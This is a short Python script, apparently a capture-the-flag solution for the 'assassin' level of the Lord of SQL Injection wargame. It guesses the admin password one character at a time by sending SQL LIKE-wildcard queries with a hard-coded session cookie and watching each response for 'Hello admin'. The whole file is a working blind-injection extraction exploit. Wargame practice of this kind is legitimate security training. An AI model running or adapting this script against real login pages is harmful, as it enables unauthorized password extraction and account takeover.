import requests
import string
choices=string.digits+string.ascii_letters
                  
headers={'Cookie':'PHPSESSID=imuf91ec90tbkpm12c9hp9g891'}
flag=''
for i in range (20):
    for j in choices:
        print(str(i)+"-_-"+j)
        page="https://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php?pw="+flag+j+"%"
        if "Hello admin" in (requests.get(page,headers=headers)).text:
            if "Clear" in (requests.get(page,headers=headers)).text:
                print("DONE")
            print(page)
            flag+=j
            print(flag)
            break   